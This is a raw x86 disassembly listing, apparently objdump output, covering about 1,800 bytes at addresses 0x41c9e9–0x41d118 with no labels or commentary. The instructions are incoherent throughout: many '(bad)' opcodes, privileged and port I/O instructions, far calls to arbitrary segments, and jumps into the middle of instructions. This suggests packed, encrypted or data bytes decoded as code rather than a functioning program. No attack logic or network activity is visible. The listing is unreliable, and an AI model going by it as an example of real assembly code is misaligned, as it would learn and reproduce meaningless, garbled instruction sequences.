  41c9e9:	js     0x41ca23
  41c9eb:	adc    bh,BYTE PTR [ebx+0xf]
  41c9ee:	bound  eax,QWORD PTR [edi+0x1a6f9080]
  41c9f4:	lods   al,BYTE PTR ds:[esi]
  41c9f5:	sahf   
  41c9f6:	hlt    
  41c9f7:	fcmovnbe st,st(0)
  41c9f9:	and    bl,bh
  41c9fb:	pop    esp
  41c9fc:	mov    ch,0xd1
  41c9fe:	push   eax
  41c9ff:	stos   DWORD PTR es:[edi],eax
  41ca00:	aaa    
  41ca01:	aas    
  41ca02:	imul   ecx,DWORD PTR [ecx+0x6318cf9a],0xebbdd9dd
  41ca0c:	fisttp DWORD PTR [ebx+0x7f]
  41ca0f:	mov    al,bh
  41ca11:	inc    edi
  41ca12:	push   ebx
  41ca13:	sub    esi,DWORD PTR [ebx+0x5]
  41ca16:	xor    dl,dl
  41ca18:	je     0x41c9d9
  41ca1a:	jmp    0x41c9cb
  41ca1c:	aad    0x9d
  41ca1e:	mov    dh,0x97
  41ca20:	test   eax,eax
  41ca22:	sub    al,0x8
  41ca24:	in     al,0x6c
  41ca26:	rol    bl,cl
  41ca28:	push   es
  41ca29:	adc    eax,0x4bc5ada0
  41ca2e:	ret    
  41ca2f:	push   ebx
  41ca30:	cwde   
  41ca31:	pop    ds
  41ca32:	shl    BYTE PTR [edx-0x2f],cl
  41ca35:	scas   eax,DWORD PTR es:[edi]
  41ca36:	push   es
  41ca37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca38:	mov    cs,WORD PTR [edi+0x27]
  41ca3b:	jbe    0x41ca2a
  41ca3d:	mov    DWORD PTR [ecx+0xd],esi
  41ca40:	(bad)  
  41ca41:	adc    al,0xc
  41ca43:	xchg   edx,eax
  41ca44:	add    BYTE PTR [ebp+0x56],dl
  41ca47:	sar    BYTE PTR [ebx-0x55019547],1
  41ca4d:	adc    al,0x8a
  41ca4f:	cli    
  41ca50:	jnp    0x41c9d9
  41ca52:	mov    ds:0x9f5eb2b,eax
  41ca57:	sti    
  41ca58:	mov    dl,0xb0
  41ca5a:	dec    edx
  41ca5b:	fist   DWORD PTR [ecx+esi*1]
  41ca5e:	inc    esp
  41ca5f:	dec    edx
  41ca60:	pop    es
  41ca61:	addr16 (bad) 
  41ca63:	popa   
  41ca64:	aaa    
  41ca65:	mov    dh,0x81
  41ca67:	push   cs
  41ca68:	and    eax,0xdbff935e
  41ca6d:	mov    ecx,ebx
  41ca6f:	mov    edx,0xd0a2942e
  41ca74:	std    
  41ca75:	mov    eax,ss
  41ca77:	pop    esi
  41ca78:	cmp    BYTE PTR fs:[edx-0x45],ch
  41ca7c:	into   
  41ca7d:	dec    eax
  41ca7e:	lahf   
  41ca7f:	mov    DWORD PTR [ecx-0x43bfcbc6],esp
  41ca85:	cli    
  41ca86:	inc    esi
  41ca87:	xchg   esp,eax
  41ca88:	jg     0x41ca98
  41ca8a:	icebp  
  41ca8b:	and    BYTE PTR [ecx+0x66],dl
  41ca8e:	inc    esp
  41ca8f:	mov    dh,bh
  41ca91:	cmc    
  41ca92:	push   ebx
  41ca93:	sbb    BYTE PTR [edx+esi*1-0x3d],dh
  41ca97:	xor    esi,DWORD PTR [ecx-0x7d]
  41ca9a:	out    0xdc,al
  41ca9c:	rcl    BYTE PTR [ecx-0x19],cl
  41ca9f:	or     edi,esi
  41caa1:	sub    DWORD PTR [edx-0x7ebb6f5a],ecx
  41caa7:	js     0x41cac9
  41caa9:	cmc    
  41caaa:	aas    
  41caab:	jg     0x41ca3a
  41caad:	(bad)  [ebx+0x3234f70f]
  41cab3:	iret   
  41cab4:	xor    eax,0x6e793b48
  41cab9:	and    esp,DWORD PTR [ebp+0x506d46b0]
  41cabf:	jbe    0x41ca51
  41cac1:	jno    0x41cac7
  41cac3:	mov    eax,0xaa9b101
  41cac8:	jmp    0x814f:0xfad4216d
  41cacf:	jo     0x41caeb
  41cad1:	jge    0x41ca91
  41cad3:	pop    eax
  41cad4:	ins    BYTE PTR es:[edi],dx
  41cad5:	jnp    0x41ca98
  41cad7:	mov    eax,0x1ea31d65
  41cadc:	jle    0x41cb4a
  41cade:	sub    BYTE PTR [eax+0xe],cl
  41cae1:	(bad)  
  41cae2:	ds mov eax,0xdafaad05
  41cae8:	adc    ebp,ecx
  41caea:	mov    es,WORD PTR [edi]
  41caec:	es popf 
  41caee:	popf   
  41caef:	push   ds
  41caf0:	addr16 sub al,0x1
  41caf3:	mov    ah,0x55
  41caf5:	test   al,0x43
  41caf7:	inc    eax
  41caf8:	mov    ds:0x363385f9,al
  41cafd:	pop    ebx
  41cafe:	and    BYTE PTR [eax+0x312dc267],dh
  41cb04:	or     ebx,edi
  41cb06:	je     0x41caf2
  41cb08:	int    0x89
  41cb0a:	cmp    bh,BYTE PTR [edi-0x743db5cb]
  41cb10:	fcomp  DWORD PTR [ecx+ebp*4+0xf]
  41cb14:	mov    cl,ah
  41cb16:	cmp    DWORD PTR [ebp-0x4b],0x65
  41cb1a:	push   esp
  41cb1b:	std    
  41cb1c:	dec    ebx
  41cb1d:	out    dx,al
  41cb1e:	sbb    eax,DWORD PTR [ebx-0x6f]
  41cb21:	retf   0xc01b
  41cb24:	pop    eax
  41cb25:	out    dx,al
  41cb26:	fistp  DWORD PTR [esi]
  41cb28:	pop    ds
  41cb29:	sbb    al,0xbb
  41cb2b:	lds    edi,FWORD PTR [esp+edi*1+0x3b]
  41cb2f:	cdq    
  41cb30:	mov    al,0x47
  41cb32:	(bad)  [edx+0x5e09982e]
  41cb38:	lock push eax
  41cb3a:	(bad)  
  41cb3c:	mov    ch,0xab
  41cb3e:	push   esi
  41cb3f:	cmp    BYTE PTR [edi],0xd4
  41cb42:	sub    eax,0xa6b7acef
  41cb47:	xchg   edi,eax
  41cb48:	or     BYTE PTR [ebx-0x47],dh
  41cb4b:	push   ebx
  41cb4c:	ror    BYTE PTR [edi-0xc],0xdd
  41cb50:	loop   0x41cb27
  41cb52:	call   0xe2f4d361
  41cb57:	mov    eax,0x443af745
  41cb5c:	jecxz  0x41cbc7
  41cb5e:	inc    ebx
  41cb5f:	and    dh,BYTE PTR [esi]
  41cb61:	scas   eax,DWORD PTR es:[edi]
  41cb62:	and    ebx,esi
  41cb64:	sbb    al,0xb3
  41cb66:	aas    
  41cb67:	jmp    0x41cb04
  41cb69:	(bad)  
  41cb6a:	pop    ebp
  41cb6b:	es jo  0x41cbe8
  41cb6e:	fwait
  41cb6f:	pop    ecx
  41cb70:	aad    0x53
  41cb72:	jmp    0x41cba5
  41cb74:	pop    ecx
  41cb75:	repz push eax
  41cb77:	std    
  41cb78:	jno    0x41cb8c
  41cb7a:	adc    al,0xa6
  41cb7c:	int3   
  41cb7d:	ss retf 0xf6c5
  41cb81:	call   FWORD PTR [ebp-0x66]
  41cb84:	loopne 0x41cbc7
  41cb86:	mov    ah,0x83
  41cb88:	ror    DWORD PTR [edi-0x7a],cl
  41cb8b:	call   0x3c11:0xa143f341
  41cb92:	popa   
  41cb93:	cmp    DWORD PTR ds:0xbd21a534,ebx
  41cb99:	cmp    eax,0xcd1781bb
  41cb9e:	xchg   esp,eax
  41cb9f:	jbe    0x41cb5c
  41cba1:	pop    edi
  41cba2:	push   es
  41cba3:	jge    0x41cb2f
  41cba5:	sbb    DWORD PTR [esi],ebx
  41cba7:	pop    esp
  41cba8:	fsub   DWORD PTR [eax]
  41cbaa:	fbstp  TBYTE PTR [edi+0x72fa76e2]
  41cbb0:	push   edx
  41cbb1:	neg    al
  41cbb3:	(bad)  
  41cbb4:	push   edx
  41cbb5:	out    dx,eax
  41cbb6:	scas   eax,DWORD PTR es:[edi]
  41cbb7:	daa    
  41cbb8:	mov    eax,ds:0xb2c5ebab
  41cbbd:	fdiv   QWORD PTR [eax-0x4d]
  41cbc0:	sub    eax,0xa339a91e
  41cbc5:	xchg   esi,eax
  41cbc6:	pop    ecx
  41cbc7:	sbb    BYTE PTR [esi],bh
  41cbc9:	mov    WORD PTR [edi-0x15],ds
  41cbcc:	icebp  
  41cbcd:	pop    ss
  41cbce:	pop    eax
  41cbcf:	inc    ebp
  41cbd0:	sub    ch,0x3
  41cbd3:	mov    dl,0x22
  41cbd5:	dec    esi
  41cbd6:	shr    ecx,cl
  41cbd8:	and    eax,0x425b4a64
  41cbdd:	cwde   
  41cbde:	daa    
  41cbdf:	fist   DWORD PTR [esi]
  41cbe1:	xchg   ecx,eax
  41cbe2:	sti    
  41cbe3:	or     DWORD PTR ss:[edx-0x3fd1c9d1],ecx
  41cbea:	mov    edi,0xfeccb057
  41cbef:	mov    al,ah
  41cbf1:	push   0xffffffc9
  41cbf3:	push   ss
  41cbf4:	mov    esi,fs
  41cbf6:	test   BYTE PTR [ecx+esi*2+0x42],ch
  41cbfa:	lea    ebp,[ecx-0x6b]
  41cbfd:	mov    dl,BYTE PTR [ecx]
  41cbff:	xor    eax,0xb86ae96c
  41cc04:	xor    cl,BYTE PTR [ecx+ecx*2+0x4bfc571]
  41cc0b:	ja     0x41cbc6
  41cc0d:	retf   
  41cc0e:	adc    DWORD PTR [ebx-0x6a],ecx
  41cc11:	inc    esp
  41cc12:	mov    al,0x9d
  41cc14:	ds sub ebp,0xfa22fd88
  41cc1b:	ret    
  41cc1c:	jmp    0x41cbac
  41cc1e:	adc    eax,0x7f642000
  41cc23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc24:	nop
  41cc25:	fs pop ds
  41cc27:	cmp    DWORD PTR [esi-0x57],0x7fa4b766
  41cc2e:	cld    
  41cc2f:	jb     0x41cc01
  41cc31:	fldcw  WORD PTR [ebp-0x45949619]
  41cc37:	add    esp,DWORD PTR [ecx-0x51]
  41cc3a:	shl    esi,cl
  41cc3c:	push   eax
  41cc3d:	or     al,bl
  41cc3f:	mov    cl,0x4
  41cc41:	adc    al,0xae
  41cc43:	or     DWORD PTR [edi+ebx*2+0x2b709f8f],edx
  41cc4a:	adc    edi,DWORD PTR [esi-0x3]
  41cc4d:	outs   dx,BYTE PTR ds:[esi]
  41cc4e:	or     bh,al
  41cc50:	push   0xffffffd8
  41cc52:	jo     0x41cc25
  41cc54:	in     al,0x14
  41cc56:	pop    ecx
  41cc57:	cbw    
  41cc59:	rcl    BYTE PTR [eax-0x13],1
  41cc5c:	pop    edx
  41cc5d:	imul   ecx,DWORD PTR [edx],0x55e41c2d
  41cc63:	or     al,0xfc
  41cc65:	xlat   BYTE PTR ds:[ebx]
  41cc66:	push   ebx
  41cc67:	(bad)  
  41cc68:	stc    
  41cc69:	add    al,0xc6
  41cc6b:	dec    ebx
  41cc6c:	adc    al,0x2b
  41cc6e:	add    BYTE PTR [esi+0x6c90a77e],ch
  41cc74:	push   ds
  41cc75:	dec    ebp
  41cc76:	fwait
  41cc77:	ins    DWORD PTR es:[edi],dx
  41cc78:	add    esp,DWORD PTR [edx-0x50]
  41cc7b:	push   esi
  41cc7c:	and    BYTE PTR [ebp+0x56],al
  41cc7f:	and    eax,0xa7d305ba
  41cc84:	clc    
  41cc85:	(bad)  
  41cc86:	jp     0x41ccb6
  41cc88:	cmp    DWORD PTR [ebx-0x5f],0x1aa54002
  41cc8f:	int3   
  41cc90:	iret   
  41cc91:	xchg   ebp,eax
  41cc92:	xchg   BYTE PTR [ecx-0x13],cl
  41cc95:	mov    eax,ds:0xf3b3c584
  41cc9a:	jmp    esi
  41cc9c:	or     al,0xf2
  41cc9e:	jl     0x41cd1e
  41cca0:	sbb    esp,ebp
  41cca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cca3:	dec    ebx
  41cca4:	pop    edi
  41cca5:	ins    DWORD PTR es:[edi],dx
  41cca6:	hlt    
  41cca7:	inc    edx
  41cca8:	outs   dx,DWORD PTR ds:[esi]
  41cca9:	mov    eax,ds:0x69d0ad4c
  41ccae:	add    eax,0x863f964
  41ccb3:	dec    esp
  41ccb4:	and    dh,BYTE PTR [esi+0x808a1db]
  41ccba:	add    bl,cl
  41ccbc:	dec    ebp
  41ccbd:	lock (bad) 
  41ccbf:	mov    eax,0x76b6b41d
  41ccc4:	dec    esi
  41ccc5:	ror    BYTE PTR [eax],cl
  41ccc7:	mov    ecx,0xba6ee6fb
  41cccc:	test   eax,0x1a3d3dd9
  41ccd1:	add    cl,BYTE PTR [edi+0x79]
  41ccd4:	jmp    0x4da18124
  41ccd9:	mov    bl,0x47
  41ccdb:	fisub  DWORD PTR [ebp-0x3546638c]
  41cce1:	adc    eax,0x6a03fe9c
  41cce6:	push   esp
  41cce7:	pop    es
  41cce8:	jl     0x41cd26
  41ccea:	cmp    BYTE PTR [ecx-0x53193725],bl
  41ccf0:	sub    eax,0xddfc72ac
  41ccf5:	sub    esp,DWORD PTR [eax]
  41ccf7:	push   eax
  41ccf8:	cs std 
  41ccfa:	fidiv  DWORD PTR [edi-0x10f95040]
  41cd00:	fwait
  41cd01:	sub    edi,DWORD PTR [edi]
  41cd03:	push   eax
  41cd04:	xor    dh,cl
  41cd06:	(bad)  
  41cd08:	mov    bl,0x39
  41cd0a:	add    ah,BYTE PTR [ecx+0x1577c48c]
  41cd10:	dec    ebp
  41cd11:	call   0x7488:0x8c034218
  41cd18:	cmp    al,dh
  41cd1a:	scas   al,BYTE PTR es:[edi]
  41cd1b:	rcr    BYTE PTR [ebp-0x30],1
  41cd1e:	cmp    ch,ch
  41cd20:	cmp    BYTE PTR [ebx+0x5c12e6f7],al
  41cd26:	ret    
  41cd27:	in     al,dx
  41cd28:	nop
  41cd29:	jbe    0x41ccd1
  41cd2b:	add    eax,esi
  41cd2d:	imul   eax,DWORD PTR [edx-0x4505226c],0x676ca271
  41cd37:	loopne 0x41cd03
  41cd39:	das    
  41cd3a:	cvtps2pd xmm5,QWORD PTR [ecx-0x716833ba]
  41cd41:	iret   
  41cd42:	(bad)  
  41cd44:	int    0x0
  41cd46:	add    ch,BYTE PTR [ecx+0x35]
  41cd49:	scas   al,BYTE PTR es:[edi]
  41cd4a:	test   DWORD PTR [edx-0x4cad2b5b],ebx
  41cd50:	cld    
  41cd51:	cmp    ecx,DWORD PTR [ebp+eax*1+0x739cbd32]
  41cd58:	adc    edi,DWORD PTR [ebp-0x13466414]
  41cd5e:	and    BYTE PTR [edx+0x64a2fe2f],dl
  41cd64:	xor    al,ah
  41cd66:	jge    0x41cda0
  41cd68:	xchg   dl,ah
  41cd6a:	cwde   
  41cd6b:	mov    dh,0x15
  41cd6d:	xor    eax,esi
  41cd6f:	jp     0x41cdda
  41cd71:	mov    ch,0xc1
  41cd73:	rol    DWORD PTR [eax+ebx*8+0x5c],cl
  41cd77:	push   0x5e6141c0
  41cd7c:	addr16 pop edx
  41cd7e:	inc    ebp
  41cd7f:	fdivp  st(5),st
  41cd81:	add    ebp,DWORD PTR [bx]
  41cd84:	inc    ebp
  41cd85:	(bad)  
  41cd86:	div    BYTE PTR [esi+eax*1-0x7d7c76a7]
  41cd8d:	lods   eax,DWORD PTR ds:[esi]
  41cd8e:	xor    eax,0x33a1d196
  41cd93:	push   esi
  41cd94:	dec    ebx
  41cd95:	inc    ebx
  41cd96:	icebp  
  41cd97:	call   0xb5ec:0xa857f247
  41cd9e:	sub    ebp,DWORD PTR [eax]
  41cda0:	aas    
  41cda1:	pusha  
  41cda2:	and    al,0x6f
  41cda4:	or     bl,BYTE PTR [ecx-0x4d81489]
  41cdaa:	sub    eax,ebx
  41cdac:	dec    ebp
  41cdad:	ficom  WORD PTR [ebx+0x22e3323d]
  41cdb3:	out    0x84,eax
  41cdb5:	cld    
  41cdb6:	jecxz  0x41cdd8
  41cdb8:	pop    ds
  41cdb9:	mov    esi,ds
  41cdbb:	add    eax,0xec85425a
  41cdc0:	sti    
  41cdc1:	(bad)  
  41cdc2:	les    edi,FWORD PTR [edx]
  41cdc4:	popa   
  41cdc5:	shl    BYTE PTR [esi-0xf30f981],0xbf
  41cdcc:	adc    DWORD PTR [edi-0x74],ecx
  41cdcf:	pop    edi
  41cdd0:	ds push esp
  41cdd2:	pop    esp
  41cdd3:	fisubr WORD PTR [ebp-0x78]
  41cdd6:	shr    DWORD PTR [ecx],1
  41cdd8:	inc    ebx
  41cdd9:	(bad)  
  41cdda:	jo     0x41ce13
  41cddc:	dec    ecx
  41cddd:	sti    
  41cdde:	popa   
  41cddf:	fbld   TBYTE PTR ds:0xf34f65d8
  41cde5:	push   ds
  41cde6:	xchg   esp,eax
  41cde7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cde8:	xchg   BYTE PTR [ebp+0x39aa71de],al
  41cdee:	jge    0x41cdae
  41cdf0:	dec    edx
  41cdf1:	or     al,0x3b
  41cdf3:	std    
  41cdf4:	adc    ch,BYTE PTR [esi]
  41cdf6:	fnstenv [ecx+0x319a9b5e]
  41cdfc:	adc    BYTE PTR [esi],ah
  41cdfe:	repz and al,0x37
  41ce01:	in     eax,dx
  41ce02:	and    DWORD PTR [ebx+0x4b770d4],esp
  41ce08:	dec    eax
  41ce09:	add    eax,0x14fb86dc
  41ce0e:	out    dx,al
  41ce0f:	cmp    DWORD PTR [esi],ebx
  41ce11:	adc    al,0xaf
  41ce13:	and    ebp,DWORD PTR [esi]
  41ce15:	js     0x41ce21
  41ce17:	jle    0x41cded
  41ce19:	sti    
  41ce1a:	push   eax
  41ce1b:	stos   DWORD PTR es:[edi],eax
  41ce1c:	jnp    0x41cde1
  41ce1e:	and    BYTE PTR [edi+eiz*8],al
  41ce21:	xchg   BYTE PTR [esp+ecx*8-0x1d],dl
  41ce25:	sub    BYTE PTR [edi+0x77bebc0],bh
  41ce2b:	push   edx
  41ce2c:	xchg   DWORD PTR [edi+0x293e1d84],edi
  41ce32:	jbe    0x41ce5a
  41ce34:	daa    
  41ce35:	into   
  41ce36:	test   al,0x8f
  41ce38:	cmp    al,ah
  41ce3a:	mov    ah,0xd6
  41ce3c:	mov    ah,0xdb
  41ce3e:	les    esp,FWORD PTR [ebp+0x34]
  41ce41:	jecxz  0x41ce7a
  41ce43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce44:	popf   
  41ce45:	rcl    ebx,cl
  41ce47:	sub    al,0x4e
  41ce49:	xor    ecx,DWORD PTR [ebp+edi*2+0x1a4a7abe]
  41ce50:	out    0xc1,al
  41ce52:	dec    edx
  41ce53:	mov    es,WORD PTR [esi]
  41ce55:	call   0xfba5d5db
  41ce5a:	add    esi,DWORD PTR [ebp+0x402c90d2]
  41ce60:	(bad)  
  41ce61:	cdq    
  41ce62:	mov    ecx,0x59541df8
  41ce67:	mov    WORD PTR [esi+esi*2+0x1add9674],gs
  41ce6e:	inc    ebp
  41ce6f:	retf   0xde45
  41ce72:	push   ebx
  41ce73:	and    eax,0xc88da128
  41ce78:	inc    ebx
  41ce79:	xchg   esi,eax
  41ce7a:	or     DWORD PTR [eax],0x75
  41ce7d:	fstp   DWORD PTR [esi]
  41ce7f:	or     eax,0xa50aaae2
  41ce84:	xchg   ecx,eax
  41ce85:	(bad)  
  41ce86:	mov    eax,ds:0xd557734c
  41ce8b:	nop
  41ce8c:	mov    eax,0x4dcd87c3
  41ce91:	not    DWORD PTR [ebx-0x14]
  41ce94:	mov    cl,0x6
  41ce96:	or     edi,ebx
  41ce98:	repz adc al,0xe4
  41ce9b:	fistp  DWORD PTR [ebp-0x18a6361d]
  41cea1:	clc    
  41cea2:	or     ch,BYTE PTR ds:0x41d72d7b
  41cea8:	dec    edi
  41cea9:	xor    dl,cl
  41ceab:	(bad)  
  41ceaf:	sub    al,0x56
  41ceb1:	xchg   esp,eax
  41ceb2:	out    0xb5,eax
  41ceb4:	ja     0x41cea1
  41ceb6:	add    eax,0x298e2c87
  41cebb:	or     edi,DWORD PTR [edi]
  41cebd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cebe:	xchg   ecx,eax
  41cebf:	xor    BYTE PTR [ebp-0x2b],al
  41cec2:	das    
  41cec3:	mov    ebx,0x55a18f96
  41cec8:	out    0xe7,al
  41ceca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cecb:	fdivr  DWORD PTR [edi]
  41cecd:	mov    esp,0xaaffa94d
  41ced2:	fdiv   QWORD PTR [esi]
  41ced4:	mov    edi,0x782ba44
  41ced9:	pop    edi
  41ceda:	dec    edi
  41cedb:	adc    DWORD PTR [esi-0x5026974f],esi
  41cee1:	(bad)  
  41cee2:	fmulp  st(7),st
  41cee4:	(bad)  
  41cee5:	pop    esp
  41cee6:	iret   
  41cee7:	jb     0x41ceec
  41cee9:	sub    dh,BYTE PTR [edi+0x3efcf810]
  41ceef:	clc    
  41cef0:	fwait
  41cef1:	shl    DWORD PTR [eax],cl
  41cef3:	adc    DWORD PTR [ebx],ebx
  41cef5:	mov    ah,BYTE PTR [edx]
  41cef7:	xchg   esi,eax
  41cef8:	adc    DWORD PTR [esi],ebp
  41cefa:	mov    esp,0x599b33a8
  41ceff:	xor    DWORD PTR [ebx],ebx
  41cf01:	dec    ebx
  41cf02:	dec    edx
  41cf03:	sti    
  41cf04:	gs popa 
  41cf06:	xor    BYTE PTR [ebp-0x38],ah
  41cf09:	push   es
  41cf0a:	bound  esp,QWORD PTR [edi+0x41]
  41cf0d:	retf   
  41cf0e:	outs   dx,DWORD PTR ds:[esi]
  41cf0f:	in     al,0xc1
  41cf11:	sbb    esi,DWORD PTR [ecx+eax*2]
  41cf14:	or     eax,0x9fa746a4
  41cf19:	add    bh,0x1d
  41cf1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf1d:	lods   al,BYTE PTR ds:[esi]
  41cf1e:	ins    BYTE PTR es:[edi],dx
  41cf1f:	jbe    0x41cf11
  41cf21:	jg     0x41cf46
  41cf23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf24:	mov    bl,0xe4
  41cf26:	jnp    0x41cf26
  41cf28:	mov    eax,ds:0xfefdc71b
  41cf2d:	ficomp DWORD PTR [eax+0x2]
  41cf30:	sub    al,0xa9
  41cf32:	imul   edx,DWORD PTR [edi+0x760f429],0x6d058955
  41cf3c:	stos   DWORD PTR es:[edi],eax
  41cf3d:	and    BYTE PTR [ebp+0x28],cl
  41cf40:	ss jg  0x41cf60
  41cf43:	stc    
  41cf44:	es (bad) 
  41cf46:	fxch   st(7)
  41cf48:	push   ecx
  41cf49:	xor    BYTE PTR [edx],0x13
  41cf4c:	inc    eax
  41cf4d:	cmp    dh,al
  41cf4f:	ret    0x4372
  41cf52:	js     0x41cf0a
  41cf54:	xchg   edi,eax
  41cf55:	pop    ecx
  41cf56:	inc    esi
  41cf57:	dec    ecx
  41cf58:	mov    BYTE PTR [eax+0x580f214b],dh
  41cf5e:	and    bl,BYTE PTR es:[eax+0x68]
  41cf62:	in     eax,dx
  41cf63:	in     al,0x20
  41cf65:	mov    WORD PTR [ecx-0x57],cs
  41cf68:	ja     0x41cf93
  41cf6a:	fimul  DWORD PTR [edi-0x5f54ef43]
  41cf70:	hlt    
  41cf71:	mov    bl,0x3b
  41cf73:	arpl   cx,bp
  41cf75:	cmp    ecx,DWORD PTR [ebx+0x44]
  41cf78:	cmp    BYTE PTR [edx],0x7f
  41cf7b:	and    bl,BYTE PTR [eax]
  41cf7d:	adc    DWORD PTR [ebx],0x2a738b23
  41cf83:	(bad)  
  41cf84:	adc    ebx,DWORD PTR [ebx+0x4d]
  41cf87:	pop    esi
  41cf88:	sub    DWORD PTR [esi],ebx
  41cf8a:	or     ah,BYTE PTR [esi-0x67]
  41cf8d:	pop    ds
  41cf8e:	jns    0x41cfb5
  41cf90:	cmc    
  41cf91:	mov    ah,0x55
  41cf93:	adc    al,0x8d
  41cf95:	shl    BYTE PTR ds:0x2e2a4136,0xf9
  41cf9c:	pop    es
  41cf9d:	pushf  
  41cf9e:	jnp    0x41cf29
  41cfa0:	push   ss
  41cfa1:	mov    BYTE PTR [edx-0x7b9406ec],al
  41cfa7:	dec    DWORD PTR [eax+esi*1+0x2725a4a3]
  41cfae:	adc    dl,BYTE PTR [eax+0x6452ff9a]
  41cfb4:	sbb    eax,edi
  41cfb6:	lds    esi,FWORD PTR [esi+0x6]
  41cfb9:	ss push edx
  41cfbb:	sbb    eax,0x44395223
  41cfc0:	cmp    eax,0xa7e8dd50
  41cfc5:	mov    ah,0x2d
  41cfc7:	fwait
  41cfc8:	hlt    
  41cfc9:	mov    DWORD PTR [ebp+0x72],ebp
  41cfcc:	mov    edx,DWORD PTR ds:0xee823170
  41cfd2:	out    dx,eax
  41cfd3:	sub    edx,DWORD PTR [eax+edi*1-0x37]
  41cfd7:	lods   eax,DWORD PTR ds:[esi]
  41cfd8:	in     eax,0x51
  41cfda:	scas   eax,DWORD PTR es:[edi]
  41cfdb:	vreducess xmm0{k7}{z},xmm4,(bad),0xc3
  41cfdd:	pop    ebp
  41cfde:	mov    edi,0x6c1b4357
  41cfe3:	xlat   BYTE PTR ds:[bx]
  41cfe5:	xor    edx,edi
  41cfe7:	xor    BYTE PTR [ebx],dh
  41cfe9:	outs   dx,DWORD PTR ds:[esi]
  41cfea:	in     eax,0x60
  41cfec:	mov    edi,ss
  41cfee:	xor    esi,edx
  41cff0:	mov    eax,ds:0x5503d32d
  41cff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cff7:	dec    ecx
  41cff8:	mov    eax,0x9e82e271
  41cffd:	xchg   edx,eax
  41cffe:	test   eax,0x45697811
  41d003:	pop    esi
  41d004:	lds    esi,FWORD PTR [ebx]
  41d006:	push   eax
  41d007:	mov    edx,ecx
  41d009:	ss into 
  41d00b:	loope  0x41d058
  41d00d:	neg    BYTE PTR [edi-0x47]
  41d010:	mov    al,BYTE PTR [eax-0x3b]
  41d013:	and    eax,0x447b4f77
  41d018:	popa   
  41d019:	arpl   WORD PTR [ecx-0x20d12c82],cx
  41d01f:	mov    eax,ds:0xb88b04d3
  41d024:	and    eax,0x9a99ccd5
  41d029:	xor    ecx,DWORD PTR [ebx-0x40]
  41d02c:	pop    ecx
  41d02d:	test   BYTE PTR [eax+0x72321006],bh
  41d033:	jmp    FWORD PTR [ebx+0x6a186968]
  41d039:	aas    
  41d03a:	push   es
  41d03b:	pop    edx
  41d03c:	out    0x2,al
  41d03e:	(bad)  
  41d03f:	dec    eax
  41d040:	mov    dh,0xcb
  41d042:	clc    
  41d043:	inc    ebp
  41d044:	fdivr  DWORD PTR [ebx+0x66f6c70a]
  41d04a:	clc    
  41d04b:	pushf  
  41d04c:	test   BYTE PTR [edi+0x671414b9],ah
  41d052:	lods   eax,DWORD PTR ds:[esi]
  41d053:	add    DWORD PTR [edx-0x44],0xe3568673
  41d05a:	repz jg 0x41d003
  41d05d:	mov    al,ds:0x8ff4621b
  41d062:	dec    ecx
  41d063:	fisttp QWORD PTR [edx+0x2d14c48a]
  41d069:	pusha  
  41d06a:	or     BYTE PTR ds:0x96c7d2a6,cl
  41d070:	fcom   DWORD PTR [eax+eiz*8]
  41d073:	push   esp
  41d074:	inc    esi
  41d075:	xor    BYTE PTR [edx+0x5e7fa810],0xd
  41d07c:	cs pop ds
  41d07e:	jbe    0x41d0b1
  41d080:	int3   
  41d081:	repz int3 
  41d083:	inc    esp
  41d084:	cs dec ecx
  41d086:	jne    0x41d068
  41d088:	arpl   WORD PTR [ecx+0x3b],bp
  41d08b:	scas   al,BYTE PTR es:[edi]
  41d08c:	adc    bl,0xfc
  41d08f:	(bad)  
  41d091:	ss sub al,0x53
  41d094:	call   0x9df3:0xb32ee845
  41d09b:	sub    BYTE PTR [edi+eiz*1-0x745ecdb0],bl
  41d0a2:	xor    edi,DWORD PTR [edi-0x6f]
  41d0a5:	je     0x41d048
  41d0a7:	inc    eax
  41d0a8:	sub    dl,BYTE PTR [edx]
  41d0aa:	iret   
  41d0ab:	sub    DWORD PTR [ebx-0x4a],edx
  41d0ae:	cmp    DWORD PTR [edi+edx*1+0x52],ecx
  41d0b2:	in     al,0xce
  41d0b4:	sahf   
  41d0b5:	mov    ecx,0x842fbcb4
  41d0ba:	loopne 0x41d07c
  41d0bc:	cdq    
  41d0bd:	pop    ds
  41d0be:	xchg   edi,eax
  41d0bf:	adc    eax,0x1522b0c4
  41d0c4:	add    eax,DWORD PTR [edi-0x197ea07c]
  41d0ca:	retf   
  41d0cb:	(bad)  
  41d0cc:	mov    cl,0xbf
  41d0ce:	jno    0x41d0b2
  41d0d0:	test   DWORD PTR [eax+0x51],esp
  41d0d3:	lods   al,BYTE PTR ds:[esi]
  41d0d4:	add    al,BYTE PTR [ebp-0x7b]
  41d0d7:	cmp    eax,esi
  41d0d9:	repz imul esi,ebp,0xffffffff
  41d0dd:	aaa    
  41d0de:	jl     0x41d108
  41d0e0:	dec    esp
  41d0e1:	push   ss
  41d0e2:	add    esi,DWORD PTR [ebx]
  41d0e4:	push   ss
  41d0e5:	enter  0x8805,0xd5
  41d0e9:	xchg   DWORD PTR [ebp+0x33a726c6],edx
  41d0ef:	jle    0x41d138
  41d0f1:	hlt    
  41d0f2:	outs   dx,DWORD PTR ds:[esi]
  41d0f3:	(bad)  
  41d0f4:	js     0x41d0b9
  41d0f6:	inc    esp
  41d0f7:	ret    0x8fb5
  41d0fa:	fsubr  QWORD PTR [edx-0x62]
  41d0fd:	lock ficom DWORD PTR [ecx-0xb]
  41d101:	fs scas al,BYTE PTR es:[edi]
  41d103:	inc    edi
  41d104:	and    eax,0x3fbeb34c
  41d109:	sub    DWORD PTR [eax+0x54],edx
  41d10c:	fbstp  TBYTE PTR [ebx]
  41d10e:	xchg   esp,eax
  41d10f:	sub    eax,0x8b015a38
  41d114:	cmp    dh,dh
  41d116:	and    dl,BYTE PTR [eax]
  41d118:	pop    ds
